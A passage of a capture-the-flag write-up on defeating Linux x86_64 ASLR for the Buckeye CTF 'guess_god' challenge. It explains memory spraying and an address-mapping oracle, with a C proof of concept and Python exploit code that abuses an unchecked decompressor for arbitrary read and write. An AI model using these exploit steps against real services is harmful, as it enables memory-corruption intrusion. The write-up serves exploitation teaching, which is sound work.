> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [github.com](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64)

> Contribute to nick0ve/how-to-bypass-aslr-on-linux-x86_64 development by creating an account on GitHub......

In this article, I'll discuss about the application of the technique described by [Samuel Groß](https://twitter.com/5aelo) in his [Remote iPhone Exploitation Part 2: Bringing Light into the Darkness -- a Remote ASLR Bypass](https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-2.html), to bypass ASLR on Linux x86_64.

To show this I'm gonna solve a pwnable challenge from [Buckeye CTF](https://ctf.osucyber.club/), guess_god.

I'll try to keep the content as beginner friendly as possible, so feel free to skip any section if you feel confident enough and just want to see the exploit.

[![](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/raw/main/images/intro-chall-description.png)](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/images/intro-chall-description.png)

I didn't play the CTF, but I got interested in the challenge about 2hrs before the ctf end thanks to [Guray00](https://github.com/Guray00), who was asking for help in [fibonhack](https://twitter.com/fibonhack) discord about some crypto shenanigans.

I couldn't help him, but I took a look at pwnable challenges, and figured it would be good to understand the P0 blogpost and hopefully get that bounty.

[](#11-what-is-aslr)1.1 What is ASLR?
-------------------------------------

**Address Space Layout Randomization** (ASLR) is a computer security technique which involves **randomly positioning** the base address of an executable and the position of libraries, heap, and stack, in a process's address space.

[](#12-aslr-on-linux)1.2 ASLR on Linux
--------------------------------------

On linux, you can inspect the mappings of a process given its pid through [procfs](https://www.kernel.org/doc/Documentation/filesystems/proc.txt), by reading the file `/proc/<pid>/maps`.

If you are a process and you want to know your own memory mappings, you can read `/proc/<pid>/maps`.

For example, you can try to read `/proc/self/maps` with `cat`:

```
root@088ec31b2ce9:/home/ctf/challenge# cat /proc/self/maps
55faeb01c000-55faeb01e000 r--p 00000000 fe:01 2497233                    /usr/bin/cat
55faeb01e000-55faeb023000 r-xp 00002000 fe:01 2497233                    /usr/bin/cat
55faeb023000-55faeb026000 r--p 00007000 fe:01 2497233                    /usr/bin/cat
55faeb026000-55faeb027000 r--p 00009000 fe:01 2497233                    /usr/bin/cat
55faeb027000-55faeb028000 rw-p 0000a000 fe:01 2497233                    /usr/bin/cat
55faeb115000-55faeb136000 rw-p 00000000 00:00 0                          [heap]
7fe15dfb1000-7fe15dfd5000 rw-p 00000000 00:00 0
7fe15dfd5000-7fe15dffb000 r--p 00000000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15dffb000-7fe15e166000 r-xp 00026000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15e166000-7fe15e1b2000 r--p 00191000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15e1b2000-7fe15e1b5000 r--p 001dc000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15e1b5000-7fe15e1b8000 rw-p 001df000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15e1b8000-7fe15e1c3000 rw-p 00000000 00:00 0
7fe15e1c7000-7fe15e1c8000 r--p 00000000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fe15e1c8000-7fe15e1ef000 r-xp 00001000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fe15e1ef000-7fe15e1f9000 r--p 00028000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fe15e1f9000-7fe15e1fb000 r--p 00031000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fe15e1fb000-7fe15e1fd000 rw-p 00033000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fff4388f000-7fff438b0000 rw-p 00000000 00:00 0                          [stack]
7fff43989000-7fff4398d000 r--p 00000000 00:00 0                          [vvar]
7fff4398d000-7fff4398f000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

root@088ec31b2ce9:/home/ctf/challenge# cat /proc/self/maps
55ffc0b1b000-55ffc0b1d000 r--p 00000000 fe:01 2497233                    /usr/bin/cat
55ffc0b1d000-55ffc0b22000 r-xp 00002000 fe:01 2497233                    /usr/bin/cat
55ffc0b22000-55ffc0b25000 r--p 00007000 fe:01 2497233                    /usr/bin/cat
55ffc0b25000-55ffc0b26000 r--p 00009000 fe:01 2497233                    /usr/bin/cat
55ffc0b26000-55ffc0b27000 rw-p 0000a000 fe:01 2497233                    /usr/bin/cat
55ffc2108000-55ffc2129000 rw-p 00000000 00:00 0                          [heap]
7f1ec6e0f000-7f1ec6e33000 rw-p 00000000 00:00 0
7f1ec6e33000-7f1ec6e59000 r--p 00000000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec6e59000-7f1ec6fc4000 r-xp 00026000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec6fc4000-7f1ec7010000 r--p 00191000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec7010000-7f1ec7013000 r--p 001dc000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec7013000-7f1ec7016000 rw-p 001df000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec7016000-7f1ec7021000 rw-p 00000000 00:00 0
7f1ec7025000-7f1ec7026000 r--p 00000000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7f1ec7026000-7f1ec704d000 r-xp 00001000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7f1ec704d000-7f1ec7057000 r--p 00028000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7f1ec7057000-7f1ec7059000 r--p 00031000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7f1ec7059000-7f1ec705b000 rw-p 00033000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7ffc72fa4000-7ffc72fc5000 rw-p 00000000 00:00 0                          [stack]
7ffc72fe7000-7ffc72feb000 r--p 00000000 00:00 0                          [vvar]
7ffc72feb000-7ffc72fed000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


```

### [](#memory-mappings-patterns)Memory mappings patterns

If you do this a couple of times, you could deduce that:

*   The binary PIE base should be in the range 0x00005500_00000000-0x00005700_00000000, which means 2TB of possible addresses.
*   The heap is near the binary.
*   Libraries fall in the range 0x00007f00_00000000 - 0x00007fff_ffffffff, 1TB of possible addresses.
*   Stack goes (most of the time) in the range 0x00007ffc_00000000 - 0x00007fff_ffffffff, 16gb of possible addresses.
*   The range 0xffffffffff600000 - 0xffffffffff601000 is always mapped, you can read [this article](http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/13/vsyscall-and-vdso) if you are curious about what it is.

[](#13-how-to-bypass-aslr-without-an-infoleak)1.3 How to bypass ASLR without an infoleak
----------------------------------------------------------------------------------------

Let's discuss what you can do to bypass ASLR when no information leak is possble.

This is my attempt to summarize what I got from reading Saelo's blogpost.

To bypass ASLR you need:

*   A memory spraying technique, which lets you map contiguous memory of a given size, on a given range of addresses.
    
    As [he says](https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-2.html#:~:text=By%20abusing%20a%20memory%20leak%20(not%20an%20information%20leak!)%2C%20a%20bug%20in%20which%20a%20chunk%20of%20memory%20is%20%E2%80%9Cforgotten%E2%80%9D%20and%20never%20freed%2C%20and%20triggering%20it%20multiple%20times%20until%20the%20desired%20amount%20of%20memory%20has%20been%20leaked.) there are two ways of doing it:
    
    1.  By abusing a memory leak (not an information leak!), a bug in which a chunk of memory is “forgotten” and never freed, and triggering it multiple times until the desired amount of memory has been leaked.
    2.  By finding and abusing an “amplification gadget”: a piece of code that takes an existing chunk of data and copies it, potentially multiple times, thus allowing the attacker to spray a large amount of memory by only sending a relatively small number of bytes.
*   An `isAddressMapped` oracle, which given an address tells you wheter or not that address is mapped.
    

### [](#poc-of-aslr-bypass-on-linux)PoC of ASLR bypass on Linux

On Linux, it is possible to completely break ASLR if you are able to allocate 16TB of memory.

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    // 64gb
    size_t size = 0x1000000000;

    // 16TB allocations
    for (int i = 0; i < 256; i++) {
        void *mem = malloc(size); // this actually calls mmap because size is big
        if (!mem) {
            puts("Failed");
            return 1;
        }
        printf("%p\n", mem);
    }

    unsigned int *mem = (void*)0x7f0000000000ULL;
    *mem = 0x41414141;
    printf("R/W to %p: %x\n", mem, *mem);

    return 0;
}

```

### [](#boundary-cross-trick)Boundary cross trick

If you look at the addresses returned by malloc you can better understand what is happening. Protip: look at the most significant bytes.

<table><thead><tr><th>mem</th><th>16tb boundary cross?</th></tr></thead><tbody><tr><td>0x7fb03b55e010</td><td>No</td></tr><tr><td>0x7fa03b55d010</td><td>No</td></tr><tr><td>0x7f903b55c010</td><td>No</td></tr><tr><td>0x7f803b55b010</td><td>No</td></tr><tr><td>0x7f703b55a010</td><td>No</td></tr><tr><td>0x7f603b559010</td><td>No</td></tr><tr><td>0x7f503b558010</td><td>No</td></tr><tr><td>0x7f403b557010</td><td>No</td></tr><tr><td>0x7f303b556010</td><td>No</td></tr><tr><td>0x7f203b555010</td><td>No</td></tr><tr><td>0x7f103b554010</td><td>No</td></tr><tr><td>0x7f003b553010</td><td>No</td></tr><tr><td>0x7ef03b552010</td><td>Yes</td></tr><tr><td>0x7ee03b551010</td><td>Yes</td></tr><tr><td>0x7ed03b550010</td><td>Yes</td></tr><tr><td>0x7ec03b54f010</td><td>Yes</td></tr></tbody></table>

The poc is exploiting the fact that, at some point, the most significant byte of the address returned changes from 7F to 7E and since the allocations are contiguous there must be something inside that range. (Yeah we are applying the [Bolzano-Weirstress theorem](https://en.wikipedia.org/wiki/Intermediate_value_theorem) to solve this problem!)

Thankfully to the author, the zip contains binaries, source code and dockerfile to reproduce the same environment as the remote one.

[![](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/raw/main/images/intro-dist-files.png)](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/images/intro-dist-files.png)

[](#21-initial-foothold)2.1 Initial foothold
--------------------------------------------

It's always a good thing to grasp some knowledge about the environment, let's scroll through the files and take some notes.

*   jail.cfg set some restrictions, let's not forget about those limits since they might screw up the exploit:
    
    ```
    time_limit: 300
    cgroup_cpu_ms_per_sec: 100
    cgroup_pids_max: 64
    rlimit_fsize: 2048
    rlimit_nofile: 2048
    cgroup_mem_max: 1073741824 # 1GB
    
    ```
    
*   From the Dockerfile we can learn some interesting things:
    
    1.  Build and install oatpp 1.2.5, maybe there are useful bugs in this specific version?
        
        ```
        # Install oatpp
        RUN git clone https://github.com/oatpp/oatpp.git
        RUN cd /oatpp && git checkout 1.2.5 && mkdir build && cd build && cmake .. && make install
        
        
        ```
        
    2.  It builds the challenge from scratch
        
        ```
        WORKDIR /home/ctf/challenge/src/
        RUN mkdir -p src/build && cd src/build && cmake .. && make
        RUN cp src/build/flag_server-exe src/build/libkylezip.so flag.txt /   home/  ctf/challenge/
        
        
        ```
        
        This might be a problem, so let's copy the distribuited binaries instead.
        
        ```
        COPY bins/flag_server-exe /home/ctf/challenge/
        COPY bins/libkylezip.so /home/ctf/challenge/
        
        
        ```
        
*   And the last thing, check the protections of the binaries provided
    
    [![](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/raw/main/images/checksec.png)](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/images/checksec.png)  
    
    Sweet, libkylezip.so is compiled with Partial RELRO, that means that the GOT is writable, keep that in mind for when we want to get code execution.

[](#22-setup-the-local-environment-and-poke-the-application)2.2 Setup the local environment and poke the application
--------------------------------------------------------------------------------------------------------------------

docker-compose.yml file is provided so it is not hard at all to get a working local environment to poke. For those of you that are not confident with docker here is the list of commands you need to know to poke the challenge locally.

```
docker-compose build # Build the image, do this whenever you change something
docker-compose up # start the container
docker-compose down # stop the container

docker ps # list containers
docker exec -it <CONTAINER ID> <COMMAND> # exec COMMAND into the container

```

After doing `docker-compose build` you can execute `docker-compose up` to start the container, and connect to the challenge with `nc 127.0.0.1 9000`

[![](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/raw/main/images/docker-up-nc.png)](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/images/docker-up-nc.png)  

Now that we have some basic knowledge about what we should do in order to bypass ASLR, let's look at the source code, keeping in mind that we want to:

*   a way to spray memory in known ranges of memory
*   an isAddrMapped oracle

[![](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/raw/main/images/source-code-folder.png)](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/images/source-code-folder.png)  
_Source code folder_

It's mostly glue code to get an oatpp web server up and running, in fact the important files which we are gonna analyze are:

*   src/controller/MyController.*
*   kylezip/decompress.*

[](#31-mycontroller)3.1 MyController.*
--------------------------------------

[![](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/raw/main/images/MyControllerHpp.png)](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/images/MyControllerHpp.png)  
_MyController.hpp_

There are 3 endpoints:

*   `/`
*   `GET /files/{fileId}` -> Download a previously uploaded file, if extract is true extract before downloading it.
*   `POST /upload/{fileId}` -> Upload a file given a {fileId}.

And one function implemented in `MyController.cpp`

```
std::shared_ptr<oatpp::base::StrBuffer> MyController::get_file(int file_id, bool extract) 

```

which:

*   Set `to_open` to `{file_id}` or `{file_id}.unkyle`
    
    ```
    std::ostringstream comp_fname;
    comp_fname << filename;
    if (extract) {
      // Want the un-kylezip-d version
      comp_fname << ".unkyle";
    }
    auto to_open = comp_fname.str();
    
    ```
    
*   If it's the first time we are requesting to extract `{file_id}` then it calls decompress on it, which will write the decompressed file of `{file_id}` to `{file_id}.unkyle`.
    
    ```
    int fd = open(to_open.c_str(), O_RDONLY);
    if (fd == -1) {
        if (!extract) return NULL;
    
        /* Need to create decompressed version of file
         * Kyle gave me a buggy library so we are going to fork
         * in case we crash the web server will still stay up.
         */
        pid_t p = fork();
        if (p == 0) {
          decompress(filename);
          exit(0);
        } else {
          waitpid(p, NULL, 0);
        }
    
    
        fd = open(to_open.c_str(), O_RDONLY);
        if (fd == -1) {
          return NULL;
        }
    }
    
    ```
    
*   In the end `mmap` the result in memory.
    
    ```
    struct stat sb;
    
    if (fstat(fd, &sb) != 0) {
        return NULL;
    }
    
    /* mmap the file in for performance, or something... idk kyle made me write this */
    // 
    void *mem = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    
    ```
    

### [](#observations)Observations

*   [fork()](https://man7.org/linux/man-pages/man2/fork.2.html) creates a new process by duplicating the calling process, at the time of fork() both memory spaces have the same content.
    
    So if we are able to turn decompress() to an oracle which:
    
    *   Crashes on bad addresses
    *   Doesn't crash on nice addresses
    
    We could use that primitive to infer the memory space of the parent.
    
*   There is a call to `mmap` in the parent process:
    
    ```
    void *mem = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    
    
    ```
    
    if we can control `sb.st_size`, which is the size of the decompressed file, we could easily turn it into a memory spraying primitive.
    

[](#32-decompress)3.2 decompress.*
----------------------------------

### [](#decompress)decompress()

```
int decompress(const char *fname)

```

*   Map the input file to the address `0x42069000000`.
*   Map the output file to the address `0x13371337000`.
*   Calls do_decompress() which gets the decompression done.

The file is expected to be in the format:

<table><thead><tr><th>offset</th><th>name</th><th>type</th><th>description</th></tr></thead><tbody><tr><td>+0h</td><td>magic</td><td>uint64</td><td>a magic value, it is expected to be 0x0123456789abcdef</td></tr><tr><td>+8h</td><td>filesize</td><td>uint64</td><td>size of the decompressed file</td></tr></tbody></table>

### [](#do_decompress)do_decompress()

```
static void do_decompress(char *out, char *in, size_t insize)

```

You can view this function as a simple _virtual machine_, which executes the bytecode pointed by `in` and writes the output to the buffer pointed by `out`.

`in` points to our `{file_id}`.

`out` points to `{file_id.unkyle}`.

This VM has 4 opcodes:

*   0 -> NOP
    
*   1 -> STORE(u8 b)
    
    writes `b` to `out`, increments out by `1`.
    
    Opcode implementation:
    
    ```
    case 1: {
        // Write byte
        uint8_t b = in[cur++];
        *(out++) = b;
        break;
    }
    
    ```
    
*   2 -> SEEK(u64 off)
    
    set `out` to `out + off`.
    
    `out` and `off` are 64 bit values, so `out = out+off` is equivalent to `out = (out+off) % MAX_64BIT_VALUE`, this is called [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) and we can exploit this behaviour to reach any 64 bit value. Example:
    
    ```
    M64 = (1<<64) # Maximum 64bit value
    def get_off(out: int, target: int):
      return (target-out)
    
    # We are at 0xffffffff, what can we add to reach 0?
    print ('{:#x}'.format(get_off(0xffffffff, 0)))
    # Result = 0xffffffff00000000
    
    ```
    
    Opcode implementation:
    
    ```
    case 2: {
      // Seek
      uint64_t off = *(uint64_t*)(&in[cur]);
      cur += sizeof(off);
      out += off;
      break;
    }
    
    ```
    
*   3 -> LOAD(off, size). Copy `size` bytes from `out - off` to `out`, increment `out` by 8.
    
    Opcode implementation:
    
    ```
    case 3: {
      // Copy some previously written bytes
      uint64_t off = *(uint64_t*)(&in[cur]);
      cur += sizeof(off);
      uint64_t count = *(uint64_t*)(&in[cur]);
      cur += sizeof(off);
      memcpy(out, out-off, count);
      out += count;
      break;
    }
    
    ```
    

There are no bounds check in any of the operation, that gives us 2 useful primitives:

*   Read What Where, abusing `SEEK+LOAD`
*   Write What Where: abusing `SEEK+STORE`

I used this code to build the bytecode:

```
IN_ADDR = 0x42069000000 # PROT R
OUT_ADDR = 0x13371337000 # PROT RW
M64 = (1<<64)-1

class CompressedFile():
    __slots__ = ['cur', 'content', 'out']

    def __init__(self, filesize):
        self.cur = 16
        self.content = b''
        self.content += p64(0x0123456789abcdef) # magic
        self.content += p64(filesize) # file size
        self.out = OUT_ADDR

    def nop(self):
        self.content += b'\x00'
        self.cur += 1

    def write(self, b: bytes):
        assert len(b) == 1

        self.content += b'\x01' + b
        self.cur += 2
        self.out += 1 & M64

    def seek(self, off):
        self.content += b'\x02'
        self.content += p64(off)
        self.cur += 9
        self.out += off & M64

    def memcpy(self, off, count):
        # memcpy(out, out-off, count);
        self.content += b'\x03'
        self.content += p64(off)
        self.content += p64(count)
        self.cur += 17
        self.out += count & M64

```

Before diving into the exploitation phase, It is always good to build something that let you easily interact with the binary, to avoid wasting time.

```
import requests

def uploadFile(blob: bytes, fileid: int):
    assert (fileid < (1<<31) - 1)

    multipart_form_data = {
        'file': (f'payload_{fileid}', blob),
    }

    res = requests.post(
        f"http://{SERVER_IP}:{SERVER_PORT}/upload/{fileid}",
        files=multipart_form_data
    )

    return res

def getFile(fileid: int, extract="true"):
    res = requests.get(f"http://{SERVER_IP}:{SERVER_PORT}/files/{fileid}?extract={extract}")
    return res

```

### [](#inspect-the-memory-mappings-of-the-challenge)Inspect the memory mappings of the challenge

That was very important to me when trying to solve the challenge, I starred at the memory mappings for a lot of time.

To do this, you can spawn a local instance of the challenge and read the process maps after doing some operations.

[![](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/raw/main/images/read-proc-mappings.png)](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/images/read-proc-mappings.png)  

[](#42-isaddrmapped-oracle)4.2 isAddrMapped oracle
--------------------------------------------------

We are given a read what where primitive, so building an isAddressMapped oracle is not hard at all.

My way to do it was to build this bytecode:

*   `memcpy(out, targetAddress, 1)`
*   `write(b'A')`

If targetAddress is not mapped the child program segfaults on memcpy, giving us a decompressed file filled with null bytes.

If targetAddress is mapped, the decompressed file has a b'\x41' as the second byte.

```
def isAddrMapped(addr, fileid, filelen=2):
    toup = CompressedFile(filelen)
    
    # addr = OUT_ADDR - off
    off = (OUT_ADDR - addr) & M64
    # memcpy(toup.out, addr, 1)
    toup.memcpy(off, 1)
    # *(toup.out+1) = 0x41
    toup.write(b'\x41')

    uploadFile(toup.content, fileid)
    res = getFile(fileid)
    isMapped = res.content[1] == 0x41
    
    return isMapped

```

[](#43-memory-spray-primitive)4.3 Memory Spray primitive
--------------------------------------------------------

We can completely control the size of the decompressed file, and we get an mmap of that size in [MyController.cpp:62](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/resources/dist-guess-god/src/src/controller/MyController.cpp#L62).

In my exploit i used the `isAddrMapped` function, and changed the filelen.

For example, let's try to allocate a contiguous chunk of size = 0x4000000 = 64mb

```
isAddrMapped(IN_ADDR, 0, 0x4000000)

```

That's the result:

```
root@088ec31b2ce9:/home/ctf/challenge# cat /proc/47/maps
...
7f3450000000-7f3454000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle
...


```

If you try do it again:

```
isAddrMapped(IN_ADDR, 0, 0x4000000)
isAddrMapped(IN_ADDR, 0, 0x4000000)

```

That's the result:

```
7f344c000000-7f3450000000 r--p 00000000 00:af 5                          /challenge/files/1.unkyle
7f3450000000-7f3454000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle


```

Nice! Multiple allocations won't have gaps.

[](#44-how-much-memory-to-spray)4.4 How much memory to spray?
-------------------------------------------------------------

As you can see from [this poc](#poc-of-aslr-bypass-on-linux), the ideal size for the contiguous mapped memory would be 16TB.

Unfortunately, if you try to allocate 16TB of memory on the remote server, the mmap will fail, because [nsjail limit this](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64#21-initial-foothold).

After some trial and error I found out that I can spray ~3840mb of memory, with this code:

```
size =    0x000004000000
for i in range(0, 60):
    print ('.', end='')
    isAddrMapped(IN_ADDR, i, size)

```

the result memory mappings will be something like this:

### [](#memory-spray-result)Memory Spray result

```
root@088ec31b2ce9:/home/ctf/challenge# cat /proc/`pgrep flag_server-exe`/maps
...

7fe2dc000000-7fe2e0000000 r--p 00000000 00:af 121                        /challenge/files/59.unkyle
7fe2e0000000-7fe2e4000000 r--p 00000000 00:af 119                        /challenge/files/58.unkyle
7fe2e4000000-7fe2e8000000 r--p 00000000 00:af 117                        /challenge/files/57.unkyle
7fe2e8000000-7fe2ec000000 r--p 00000000 00:af 115                        /challenge/files/56.unkyle
7fe2ec000000-7fe2f0000000 r--p 00000000 00:af 113                        /challenge/files/55.unkyle
7fe2f0000000-7fe2f4000000 r--p 00000000 00:af 111                        /challenge/files/54.unkyle
7fe2f4000000-7fe2f8000000 r--p 00000000 00:af 109                        /challenge/files/53.unkyle
7fe2f8000000-7fe2fc000000 r--p 00000000 00:af 107                        /challenge/files/52.unkyle
7fe2fc000000-7fe300000000 r--p 00000000 00:af 105                        /challenge/files/51.unkyle
7fe300000000-7fe304000000 r--p 00000000 00:af 103                        /challenge/files/50.unkyle
7fe304000000-7fe308000000 r--p 00000000 00:af 101                        /challenge/files/49.unkyle
7fe308000000-7fe30c000000 r--p 00000000 00:af 99                         /challenge/files/48.unkyle
7fe30c000000-7fe310000000 r--p 00000000 00:af 97                         /challenge/files/47.unkyle
7fe310000000-7fe314000000 r--p 00000000 00:af 95                         /challenge/files/46.unkyle
7fe314000000-7fe318000000 r--p 00000000 00:af 93                         /challenge/files/45.unkyle
7fe318000000-7fe31c000000 r--p 00000000 00:af 91                         /challenge/files/44.unkyle
7fe31c000000-7fe320000000 r--p 00000000 00:af 89                         /challenge/files/43.unkyle
7fe320000000-7fe324000000 r--p 00000000 00:af 87                         /challenge/files/42.unkyle
7fe324000000-7fe328000000 r--p 00000000 00:af 85                         /challenge/files/41.unkyle
7fe328000000-7fe32c000000 r--p 00000000 00:af 83                         /challenge/files/40.unkyle
7fe32c000000-7fe330000000 r--p 00000000 00:af 81                         /challenge/files/39.unkyle
7fe330000000-7fe334000000 r--p 00000000 00:af 79                         /challenge/files/38.unkyle
7fe334000000-7fe338000000 r--p 00000000 00:af 77                         /challenge/files/37.unkyle
7fe338000000-7fe33c000000 r--p 00000000 00:af 75                         /challenge/files/36.unkyle
7fe33c000000-7fe340000000 r--p 00000000 00:af 73                         /challenge/files/35.unkyle
7fe340000000-7fe344000000 r--p 00000000 00:af 71                         /challenge/files/34.unkyle
7fe344000000-7fe348000000 r--p 00000000 00:af 69                         /challenge/files/33.unkyle
7fe348000000-7fe34c000000 r--p 00000000 00:af 67                         /challenge/files/32.unkyle
7fe34c000000-7fe350000000 r--p 00000000 00:af 65                         /challenge/files/31.unkyle
7fe350000000-7fe354000000 r--p 00000000 00:af 63                         /challenge/files/30.unkyle
7fe354000000-7fe358000000 r--p 00000000 00:af 61                         /challenge/files/29.unkyle
7fe358000000-7fe35c000000 r--p 00000000 00:af 59                         /challenge/files/28.unkyle
7fe35c000000-7fe360000000 r--p 00000000 00:af 57                         /challenge/files/27.unkyle
7fe360000000-7fe364000000 r--p 00000000 00:af 55                         /challenge/files/26.unkyle
7fe364000000-7fe368000000 r--p 00000000 00:af 53                         /challenge/files/25.unkyle
7fe368000000-7fe36c000000 r--p 00000000 00:af 51                         /challenge/files/24.unkyle
7fe36c000000-7fe370000000 r--p 00000000 00:af 49                         /challenge/files/23.unkyle
7fe370000000-7fe374000000 r--p 00000000 00:af 47                         /challenge/files/22.unkyle
7fe374000000-7fe378000000 r--p 00000000 00:af 45                         /challenge/files/21.unkyle
7fe378000000-7fe37c000000 r--p 00000000 00:af 43                         /challenge/files/20.unkyle
7fe37c000000-7fe380000000 r--p 00000000 00:af 41                         /challenge/files/19.unkyle
7fe380000000-7fe384000000 r--p 00000000 00:af 39                         /challenge/files/18.unkyle
7fe384000000-7fe388000000 r--p 00000000 00:af 37                         /challenge/files/17.unkyle
7fe388000000-7fe38c000000 r--p 00000000 00:af 35                         /challenge/files/16.unkyle
7fe38c000000-7fe390000000 r--p 00000000 00:af 33                         /challenge/files/15.unkyle
7fe390000000-7fe394000000 r--p 00000000 00:af 31                         /challenge/files/14.unkyle
7fe394000000-7fe398000000 r--p 00000000 00:af 29                         /challenge/files/13.unkyle
7fe398000000-7fe39c000000 r--p 00000000 00:af 27                         /challenge/files/12.unkyle
7fe39c000000-7fe3a0000000 r--p 00000000 00:af 25                         /challenge/files/11.unkyle
7fe3a0000000-7fe3a0021000 rw-p 00000000 00:00 0
7fe3a0021000-7fe3a4000000 ---p 00000000 00:00 0
7fe3a4000000-7fe3a8000000 r--p 00000000 00:af 23                         /challenge/files/10.unkyle
7fe3a8000000-7fe3ac000000 r--p 00000000 00:af 21                         /challenge/files/9.unkyle
7fe3ac000000-7fe3b0000000 r--p 00000000 00:af 19                         /challenge/files/8.unkyle
7fe3b0000000-7fe3b4000000 r--p 00000000 00:af 17                         /challenge/files/7.unkyle
7fe3b4000000-7fe3b8000000 r--p 00000000 00:af 15                         /challenge/files/6.unkyle
7fe3b8000000-7fe3bc000000 r--p 00000000 00:af 13                         /challenge/files/5.unkyle
7fe3bc000000-7fe3c0000000 r--p 00000000 00:af 11                         /challenge/files/4.unkyle
7fe3c0000000-7fe3c4000000 r--p 00000000 00:af 9                          /challenge/files/3.unkyle
7fe3c4000000-7fe3c8000000 r--p 00000000 00:af 7                          /challenge/files/2.unkyle
7fe3c8000000-7fe3cc000000 r--p 00000000 00:af 5                          /challenge/files/1.unkyle
7fe3cc000000-7fe3d0000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle
7fe3d0000000-7fe3d01a8000 rw-p 00000000 00:00 0
7fe3d01a8000-7fe3d4000000 ---p 00000000 00:00 0

...



```

Let's focus our attention on the addresses created with the memory spraying. (*.unkyle files)

We can try to apply the [boundary cross trick](#Boundary-cross-trick).

<table><thead><tr><th>mem</th><th>4gb boundary cross?</th></tr></thead><tbody><tr><td>7fe2dc000000</td><td>No</td></tr><tr><td>7fe2e0000000</td><td>No</td></tr><tr><td>7fe2e4000000</td><td>No</td></tr><tr><td>7fe2e8000000</td><td>No</td></tr><tr><td>7fe2ec000000</td><td>No</td></tr><tr><td>7fe2f0000000</td><td>No</td></tr><tr><td>7fe2f4000000</td><td>No</td></tr><tr><td>7fe2f8000000</td><td>No</td></tr><tr><td>7fe2fc000000</td><td>No</td></tr><tr><td>7fe300000000</td><td>Yes</td></tr><tr><td>7fe304000000</td><td>Yes</td></tr><tr><td>7fe308000000</td><td>Yes</td></tr><tr><td>By exploiting the change from 7fe2.. to 7fe3.. we can scan memory with a step of 0x100000000 = 4gb memory.</td><td></td></tr></tbody></table>

[](#45-finally-defeating-aslr)4.5 Finally defeating ASLR
--------------------------------------------------------

Given that step size, we can scan `start=0x7f0000000000` to `end=0x800000000000` with only `end - start / size` = 256 queries.

```
start = 0x7f0000000000
end = 0x800000000000 
step = 0x100000000 # 4gb

isMapped = False
j = 0xff
while isMapped == False:
    leakAddr = start + j*step
    isMapped = (isAddrMapped(leakAddr, 1000 + j))
    j -= 1

```

At this point, we have `leakAddr` which is a mapped address like this: `0x7fXX00000000`, in [this](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/Memory-Spray-result) case, `leakAddr = 0x7fe300000000`.

Now, if we want to follow the saelo technique, we should do a binary search of the range 0x7fXX00000000 - 0x7fXXffffffff, in order to find lower and upper bounds, the problem is that there are some holes in that range, so the binary search fails a lot of times.

You can check yourself with [this](https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/resources/analyze-mappings.py) script:

```
RANGE					SIZE

0x00007f7544000000 - 0x00007f763c000000	0xf8000000
SMALL GAP				0x00caa000
0x00007f763ccaa000 - 0x00007f763e358000	0x016ae000


```

